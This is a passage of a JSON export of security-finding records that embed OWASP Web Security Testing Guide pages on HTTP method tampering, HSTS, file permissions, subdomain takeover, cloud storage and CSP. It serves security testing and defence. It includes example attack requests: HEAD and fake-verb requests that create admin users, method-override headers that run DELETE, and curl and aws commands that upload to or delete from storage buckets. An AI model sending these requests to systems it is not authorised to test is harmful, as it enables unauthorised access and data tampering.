attribute.\n\n\u0060\u0060\u0060\nPATCH /api/users/foo HTTP/1.1\nHost: example.org\n\n{\n    \u0022role\u0022: \u0022admin\u0022\n}\n\u0060\u0060\u0060\n\nAs with the \u0060PUT\u0060 method, this functionality may have access control weaknesses or other vulnerabilities. Additionally, applications may not perform the same level of input validation when modifying an object as they do when creating one. This could potentially allow malicious values to be injected (such as in a stored cross-site scripting attack), or could allow broken or invalid objects that may result in business logic related issues.\n\n### Testing for Access Control Bypass\n\nIf a page on the application redirects users to a login page with a 302 code when they attempt to access it directly, it may be possible to bypass this by making a request with a different HTTP method, such as \u0060HEAD\u0060, \u0060POST\u0060 or even a made up method such as \u0060FOO\u0060. If the web application responds with a \u0060HTTP/1.1 200 OK\u0060 rather than the expected \u0060HTTP/1.1 302 Found\u0060, it may then be possible to bypass the authentication or authorization. The example below shows how a \u0060HEAD\u0060 request may result in a page setting administrative cookies, rather than redirecting the user to a login page:\n\n\u0060\u0060\u0060\nHEAD /admin/ HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\n[...]\nSet-Cookie: adminSessionCookie=[...];\n\u0060\u0060\u0060\n\nAlternatively, it may be possible to make direct requests to pages that cause actions, such as:\n\n\u0060\u0060\u0060\nHEAD /admin/createUser.php?username=foo\u0026password=bar\u0026role=admin HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\nOr:\n\n\u0060\u0060\u0060\nFOO /admin/createUser.php\nHost: example.org\nContent-Length: 36\n\nusername=foo\u0026password=bar\u0026role=admin\n\u0060\u0060\u0060\n\n### Testing for HTTP Method Overriding\n\nSome web frameworks provide a way to override the actual HTTP method in the request. They achieve this by emulating the missing HTTP verbs and passing some custom headers in the requests. The main purpose of this is to circumvent a middleware application (such as a proxy or web application firewall) which blocks specific methods. The following alternative HTTP headers could potentially be used:\n\n* \u0060X-HTTP-Method\u0060\n* \u0060X-HTTP-Method-Override\u0060\n* \u0060X-Method-Override\u0060\n\nTo test this, consider scenarios where restricted verbs like \u0060PUT\u0060 or \u0060DELETE\u0060 return a \u0060405 Method not allowed\u0060. In such cases, replay the same request, but add the alternative headers for HTTP method overriding. Then, observe the system\u2019s response. The application should respond with a different status code (*e.g.* \u0060200 OK\u0060) in cases where method overriding is supported.\nThe web server in the following example does not allow the \u0060DELETE\u0060 method and blocks it:\n\n\u0060\u0060\u0060\nDELETE /resource.html HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nHTTP/1.1 405 Method Not Allowed\n[...]\n\u0060\u0060\u0060\n\nAfter adding the \u0060X-HTTP-Method\u0060 header, the server responds to the request with a 200:\n\n\u0060\u0060\u0060\nGET /resource.html HTTP/1.1\nHost: example.org\nX-HTTP-Method: DELETE\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\n[...]\n\u0060\u0060\u0060\n\n\n## Tools\n\n* [Ncat](https://nmap.org/ncat/)\n* [cURL](https://curl.haxx.se/)\n* [Nmap http-methods NSE script](https://nmap.org/nsedoc/scripts/http-methods.html)","Implication":null,"Recommendation":"## Remediation\n\n* Ensure that only the required methods are allowed and that these methods are properly configured.\n* Ensure that no workarounds are implemented to bypass security measures implemented by user-agents, frameworks, or web servers.","References":"## References\n\n* [RFC 7231 - Hypertext Transfer Protocol (HTTP/1.1)](https://datatracker.ietf.org/doc/html/rfc7231)\n* [RFC 5789 - PATCH Method for HTTP](https://datatracker.ietf.org/doc/html/rfc5789)\n* [HTACCESS: BILBAO Method Exposed](https://web.archive.org/web/20160616172703/http://www.kernelpanik.org/docs/kernelpanik/bme.eng.pdf)\n* [Fortify - Misused HTTP Method Override](https://vulncat.fortify.com/en/detail?id=desc.dynamic.xtended_preview.often_misused_http_method_override)\n* [Mozilla Developer Network - Safe HTTP Methods](https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1"}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-07 Test HTTP Strict Transport Security","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe HTTP Strict Transport Security (HSTS) feature enables a web server to inform the user\u2019s browser, via a special response header, that it should never establish an unencrypted HTTP connection to the specified domain servers. Instead, it should automatically establish all connection requests to access the site through HTTPS. This also prevents users from overriding certificate errors.\nConsidering the importance of this security measure, it is prudent to verify that the site is using this HTTP header in order to ensure that all the data travels encrypted between the web browser and the server.\nThe HTTP strict transport security header uses three specific directives:\n\n* \u0060max-age\u0060: to indicate the number of seconds that the browser should automatically convert all HTTP requests to HTTPS.\n* \u0060includeSubDomains\u0060: to indicate that all related sub-domains must use HTTPS.\n* \u0060preload\u0060 Unofficial: to indicate that the domain(s) are on the preload list(s) and that browsers should never connect without HTTPS.\n    * While this is supported by all the major browsers, it is not an official part of the specification. (See [hstspreload.org](https://hstspreload.org/) for more information.)\n\nHere\u2019s an example of the HSTS header implementation:\n\u0060Strict-Transport-Security: max-age=31536000; includeSubDomains\u0060\nThe presence of this header must be checked, as its absence could lead to security issues such as:\n\n* Attackers intercepting and accessing the information transferred over an unencrypted network channel.\n* Attackers carrying out manipulator-in-the-middle (MITM) attacks by taking advantage of users who accept untrusted certificates.\n* Users who mistakenly enter an address in the browser using HTTP instead of HTTPS, or users who click on a link in a web application that incorrectly uses the HTTP protocol.","TestingInstructions":"## Test Objectives\n\n* Review the HSTS header and its validity.\n\n## How to Test\n\n* Confirm the presence of the HSTS header by examining the server\u2019s response through an intercepting proxy.\n* Use curl as follows:\n\n\u0060\u0060\u0060\n$ curl -s -D- https://owasp.org | grep -i strict-transport-security:\nStrict-Transport-Security: max-age=31536000\n\u0060\u0060\u0060","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [OWASP HTTP Strict Transport Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)\n* [OWASP Appsec Tutorial Series - Episode 4: Strict Transport Security](https://www.youtube.com/watch?v=zEV3HOuM_Vw)\n* [HSTS Specification](https://tools.ietf.org/html/rfc6797)\n* [Enable HTTP Strict Transport Security In Apache](https://https.cio.gov/hsts/)\n* [Enable HTTP Strict Transport Security In Nginx](https://www.nginx.com/blog/http-strict-transport-security-hsts-and-nginx/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"WSTG-CONF-08 is no longer used please go to WSTG-CONF-09 when this step is completed","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-08 Test RIA Cross Domain Policy","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"This content has been removed.","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":"This content has been removed.\n\n","Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"This content has been removed.","TestingInstructions":"This content has been removed.\n\n1. \n\n\n\u003Cbr\u003E\n","Details":"This content has been removed.\n\n1. \n\n\n\u003Cbr\u003E\n","Implication":"This content has been removed.\n\n1. \n\n\n\u003Cbr\u003E\n","Recommendation":"This content has been removed.\n\n1. \n\n\n\u003Cbr\u003E\n","References":"This content has been removed.\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"This content has been removed.","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-09 Test File Permission","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWhen a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution, or sensitive user data.\nA clear example would be an executable file that can be run by unauthorized users. For another example, consider account information or a token value used to access an API. These are increasingly seen in modern web services and microservices, and may be stored in a configuration file that has world-readable permissions by default upon installation. Such sensitive data could be exposed either by malicious internal actors within the host system or by remote attackers. The latter may have compromised the service through other vulnerabilities, while gaining only normal user privileges.","TestingInstructions":"## Test Objectives\n\n* Review and identify any rogue file permissions.\n\n## How to Test\n\nIn Linux, use \u0060ls\u0060 command to check the file permissions. Alternatively, \u0060namei\u0060 can also be used to recursively list file permissions.\n\u0060$ namei -l /PathToCheck/\u0060\nThe files and directories that require file permission testing can include, but are not limited to, the following:\n\n* Web files/directory\n* Configuration files/directory\n* Sensitive files(encrypted data, password, key)/directory\n* Log files(security logs, operation logs, admin logs)/directory\n* Executables(scripts, EXE, JAR, class, PHP, ASP)/directory\n* Database files/directory\n* Temp files/directory\n* Upload files/directory\n\n## Tools\n\n* [Windows AccessEnum](https://technet.microsoft.com/en-us/sysinternals/accessenum)\n* [Windows AccessChk](https://technet.microsoft.com/en-us/sysinternals/accesschk)\n* [Linux namei](https://linux.die.net/man/1/namei)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nSet the permissions of the files and directories properly so that unauthorized users cannot access critical resources.","References":"## References\n\n* [CWE-732: Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-10 Test for Subdomain Takeover","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nA successful exploitation of this kind of vulnerability allows an adversary to claim and take control of the victim\u2019s subdomain. This attack relies on the following:\n\n1. The victim\u2019s external DNS server subdomain record is configured to point to a non-existing or non-active resource/external service/endpoint. The proliferation of XaaS (Anything as a Service) products and public cloud services offer a lot of potential targets to consider.\n2. The service provider hosting the resource/external service/endpoint does not handle subdomain ownership verification properly.\n\nIf the subdomain takeover is successful, a wide variety of attacks are possible (serving malicious content, phishing, stealing user session cookies, credentials, etc.). This vulnerability could be exploited for a wide variety of DNS resource records including: \u0060A\u0060, \u0060CNAME\u0060, \u0060MX\u0060, \u0060NS\u0060, \u0060TXT\u0060 etc. In terms of the attack severity, an \u0060NS\u0060 subdomain takeover (although less likely) has the highest impact, because a successful attack could result in full control over the whole DNS zone and the victim\u2019s domain.\n\n### GitHub\n\n1. The victim (victim.com) uses GitHub for development and configured a DNS record (\u0060coderepo.victim.com\u0060) to access it.\n2. The victim decides to migrate their code repository from GitHub to a commercial platform and does not remove \u0060coderepo.victim.com\u0060 from their DNS server.\n3. An adversary discovers that \u0060coderepo.victim.com\u0060 is hosted on GitHub and claims it using GitHub Pages and their own GitHub account.\n\n### Expired Domain\n\n1. The victim (victim.com) owns another domain (victimotherdomain.com) and uses a CNAME record (www) to reference the other domain (\u0060www.victim.com\u0060 \u2013\u003E \u0060victimotherdomain.com\u0060)\n2. At some point, victimotherdomain.com expires, becoming available for registration by anyone. Since the CNAME record is not deleted from the victim.com DNS zone, anyone who registers \u0060victimotherdomain.com\u0060 has full control over \u0060www.victim.com\u0060 until the DNS record is removed or updated.","TestingInstructions":"## Test Objectives\n\n* Enumerate all possible domains (previous and current).\n* Identify any forgotten or misconfigured domains.\n\n## How to Test\n\n### Black-Box Testing\n\nThe first step is to enumerate the victim DNS servers and resource records. There are multiple ways to accomplish this task; for example, DNS enumeration using a list of common subdomains dictionary, DNS brute force or using web search engines and other OSINT data sources.\nUsing the dig command the tester looks for the following DNS server response messages that warrant further investigation:\n\n* \u0060NXDOMAIN\u0060\n* \u0060SERVFAIL\u0060\n* \u0060REFUSED\u0060\n* \u0060no servers could be reached.\u0060\n\n#### Testing DNS A, CNAME Record Subdomain Takeover\n\nPerform a basic DNS enumeration on the victim\u2019s domain (\u0060victim.com\u0060) using \u0060dnsrecon\u0060:\n\n\u0060\u0060\u0060\n$ ./dnsrecon.py -d victim.com\n[*] Performing General Enumeration of Domain: victim.com\n...\n[-] DNSSEC is not configured for victim.com\n[*]      A subdomain.victim.com 192.30.252.153\n[*]      CNAME subdomain1.victim.com fictioussubdomain.victim.com\n...\n\u0060\u0060\u0060\n\nIdentify which DNS resource records are dead and point to inactive/not-used services. Using the dig command for the \u0060CNAME\u0060 record:\n\n\u0060\u0060\u0060\n$ dig CNAME fictioussubdomain.victim.com\n; \u003C\u003C\u003E\u003E DiG 9.10.3-P4-Ubuntu \u003C\u003C\u003E\u003E ns victim.com\n;; global options: \u002Bcmd\n;; Got answer:\n;; -\u003E\u003EHEADER\u003C\u003C- opcode: QUERY, status: NXDOMAIN, id: 42950\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n\u0060\u0060\u0060\n\nThe following DNS responses warrant further investigation: \u0060NXDOMAIN\u0060.\nTo test the \u0060A\u0060 record the tester performs a whois database lookup and identifies GitHub as the service provider:\n\n\u0060\u0060\u0060\n$ whois 192.30.252.153 | grep \u0022OrgName\u0022\nOrgName: GitHub, Inc.\n\u0060\u0060\u0060\n\nThe tester visits \u0060subdomain.victim.com\u0060 or issues a HTTP GET request which returns a \u201C404 - File not found\u201D response which is a clear indication of the vulnerability.\n![GitHub 404 File Not Found response](Image Not Found)\n*Figure 4.2.10-1: GitHub 404 File Not Found response*\nThe tester claims the domain using GitHub Pages:\n![GitHub claim domain](Image Not Found)\n*Figure 4.2.10-2: GitHub claim domain*\n\n#### Testing NS Record Subdomain Takeover\n\nIdentify all nameservers for the domain in scope:\n\n\u0060\u0060\u0060\n$ dig ns victim.com \u002Bshort\nns1.victim.com\nnameserver.expireddomain.com\n\u0060\u0060\u0060\n\nIn this fictitious example, the tester checks if the domain \u0060expireddomain.com\u0060 is active with a domain registrar search. If the domain is available for purchase the subdomain is vulnerable.\nThe following DNS responses warrant further investigation: \u0060SERVFAIL\u0060 or \u0060REFUSED\u0060.\n\n### Gray-Box Testing\n\nThe tester has the DNS zone file available, which means DNS enumeration is not necessary. The testing methodology is the same.\n\n\u003Cbr\u003E\n## Tools\n\n* [dig - man page](https://linux.die.net/man/1/dig)\n* [recon-ng - Web Reconnaissance framework](https://github.com/lanmaster53/recon-ng)\n* [theHarvester - OSINT intelligence gathering tool](https://github.com/laramies/theHarvester)\n* [Sublist3r - OSINT subdomain enumeration tool](https://github.com/aboul3la/Sublist3r)\n* [dnsrecon - DNS Enumeration Script](https://github.com/darkoperator/dnsrecon)\n* [OWASP Amass DNS enumeration](https://github.com/OWASP/Amass)\n* [OWASP Domain Protect](https://owasp.org/www-project-domain-protect)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nTo mitigate the risk of subdomain takeover, the vulnerable DNS resource record(s) should be removed from the DNS zone. Continuous monitoring and periodic checks are recommended as best practice.","References":"## References\n\n* [HackerOne - A Guide To Subdomain Takeovers](https://www.hackerone.com/blog/Guide-Subdomain-Takeovers)\n* [Subdomain Takeover: Basics](https://0xpatrik.com/subdomain-takeover-basics/)\n* [Subdomain Takeover: Going beyond CNAME](https://0xpatrik.com/subdomain-takeover-ns/)\n* [can-i-take-over-xyz - A list of vulnerable services](https://github.com/EdOverflow/can-i-take-over-xyz/)\n* [OWASP AppSec Europe 2017 - Frans Ros\u00E9n: DNS hijacking using cloud providers \u2013 no verification needed](https://2017.appsec.eu/presos/Developer/DNS%20hijacking%20using%20cloud%20providers%20%E2%80%93%20no%20verification%20needed%20-%20Frans%20Rosen%20-%20OWASP_AppSec-Eu_2017.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-11 Test Cloud Storage","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nCloud storage services allow web applications and services to store and access objects in the storage service. Improper access control configuration, however, may lead to the exposure of sensitive information, data tampering, or unauthorized access.\nA known example is where an Amazon S3 bucket is misconfigured, although the other cloud storage services may also be exposed to similar risks. By default, all S3 buckets are private and can be accessed only by users who are explicitly granted access. Users can grant public access not only to the bucket itself but also to individual objects stored within that bucket. This may lead to an unauthorized user being able to upload new files, modify or read stored files.","TestingInstructions":"## Test Objectives\n\n* Assess that the access control configuration for the storage services is properly in place.\n\n## How to Test\n\nFirst, identify the URL to access the data in the storage service, and then consider the following tests:\n\n* read unauthorized data\n* upload a new arbitrary file\n\nYou may use curl for the tests with the following commands and see if unauthorized actions can be performed successfully.\nTo test the ability to read an object:\n\n\u0060\u0060\u0060\ncurl -X GET https://\u003Ccloud-storage-service\u003E/\u003Cobject\u003E\n\u0060\u0060\u0060\n\nTo test the ability to upload a file:\n\n\u0060\u0060\u0060\ncurl -X PUT -d \u0027test\u0027 \u0027https://\u003Ccloud-storage-service\u003E/test.txt\u0027\n\u0060\u0060\u0060\n\nIn the above command, it is recommended to replace the single quotes (\u2018) with double quotes (\u201C) when running the command on a Windows machine.\n\n### Testing for Amazon S3 Bucket Misconfiguration\n\nThe Amazon S3 bucket URLs follow one of two formats, either virtual host style or path-style.\n\n* Virtual Hosted Style Access\n\n\u0060\u0060\u0060\nhttps://bucket-name.s3.Region.amazonaws.com/key-name\n\u0060\u0060\u0060\n\nIn the following example, \u0060my-bucket\u0060 is the bucket name, \u0060us-west-2\u0060 is the region, and \u0060puppy.png\u0060 is the key-name:\n\n\u0060\u0060\u0060\nhttps://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\n\u0060\u0060\u0060\n\n* Path-Style Access\n\n\u0060\u0060\u0060\nhttps://s3.Region.amazonaws.com/bucket-name/key-name\n\u0060\u0060\u0060\n\nAs above, in the following example, \u0060my-bucket\u0060 is the bucket name, \u0060us-west-2\u0060 is the region, and \u0060puppy.png\u0060 is the key-name:\n\n\u0060\u0060\u0060\nhttps://s3.us-west-2.amazonaws.com/my-bucket/puppy.png\n\u0060\u0060\u0060\n\nFor some regions, the legacy global endpoint that does not specify a region-specific endpoint can be used. Its format is also either virtual hosted style or path-style.\n\n* Virtual Hosted Style Access\n\n\u0060\u0060\u0060\nhttps://bucket-name.s3.amazonaws.com\n\u0060\u0060\u0060\n\n* Path-Style Access\n\n\u0060\u0060\u0060\nhttps://s3.amazonaws.com/bucket-name\n\u0060\u0060\u0060\n\n#### Identify Bucket URL\n\nFor black-box testing, S3 URLs can be found in the HTTP messages. The following example shows a bucket URL is sent in the \u0060img\u0060 tag in an HTTP response.\n\n\u0060\u0060\u0060\n...\n\u003Cimg src=\u0022https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\u0022\u003E\n...\n\u0060\u0060\u0060\n\nFor gray-box testing, you can obtain bucket URLs from Amazon\u2019s web interface, documents, source code, and any other available sources.\n\n#### Testing with AWS-CLI\n\nIn addition to testing with curl, you can also test with the AWS command-line tool. In this case \u0060s3://\u0060 URI scheme is used.\n\n##### List\n\nThe following command lists all the objects of the bucket when it is configured public:\n\n\u0060\u0060\u0060\naws s3 ls s3://\u003Cbucket-name\u003E\n\u0060\u0060\u0060\n\n##### Upload\n\nThe following is the command to upload a file:\n\n\u0060\u0060\u0060\naws s3 cp arbitrary-file s3://bucket-name/path-to-save\n\u0060\u0060\u0060\n\nThis example shows the result when the upload has been successful.\n\n\u0060\u0060\u0060\n$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload: ./test.txt to s3://bucket-name/test.txt\n\u0060\u0060\u0060\n\nThis example shows the result when the upload has failed.\n\n\u0060\u0060\u0060\n$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload failed: ./test2.txt to s3://bucket-name/test2.txt An error occurred (AccessDenied) when calling the PutObject operation: Access Denied\n\u0060\u0060\u0060\n\n##### Remove\n\nThe following is the command to remove an object:\n\n\u0060\u0060\u0060\naws s3 rm s3://bucket-name/object-to-remove\n\u0060\u0060\u0060\n\n## Tools\n\n* [AWS CLI](https://aws.amazon.com/cli/)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [Working with Amazon S3 Buckets](https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html)\n* [flAWS 2 - Learn AWS Security](http://flaws2.cloud/)\n* [curl Tutorial](https://curl.se/docs/manual.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-12 Testing for Content Security Policy","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nContent Security Policy (CSP) is a declarative allow-list policy enforced through \u0060Content-Security-Policy\u0060 response header or equivalent \u0060\u003Cmeta\u003E\u0060 element. It allows developers to restrict the sources from which resources such as JavaScript, CSS, images, files etc. are loaded. CSP is an effective defense in depth technique to mitigate the risk of vulnerabilities such as Cross Site Scripting (XSS) and Clickjacking.\nContent Security Policy supports directives which allow granular control to the flow of policies. (See [References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy#references) for further details.)","TestingInstructions":"## Test Objectives\n\n* Review the Content-Security-Policy header or meta element to identify misconfigurations.\n\n## How to Test\n\nTo test for misconfigurations in CSPs, look for insecure configurations by examining the \u0060Content-Security-Policy\u0060 HTTP response header or CSP \u0060meta\u0060 element in a proxy tool:\n\n* \u0060unsafe-inline\u0060 directive enables inline scripts or styles, making the applications susceptible to [XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting) attacks.\n* \u0060unsafe-eval\u0060 directive allows \u0060eval()\u0060 to be used in the application and is susceptible to common bypass techniques such as data URL injection.\n* \u0060unsafe-hashes\u0060 directive allows use of inline scripts/styles, assuming they match the specified hashes.\n* Resources such as scripts can be allowed to be loaded from any origin by the use wildcard (\u0060*\u0060) source.\n    * Also consider wildcards based on partial matches, such as: \u0060https://*\u0060 or \u0060*.cdn.com\u0060.\n    * Consider whether allow listed sources provide JSONP endpoints which might be used to bypass CSP or same-origin-policy.\n* Framing can be enabled for all origins by the use of the wildcard (\u0060*\u0060) source for the \u0060frame-ancestors\u0060 directive. If the \u0060frame-ancestors\u0060 directive is not defined in the Content-Security-Policy header it may make applications vulnerable to [clickjacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking) attacks.\n* Business critical applications should require to use 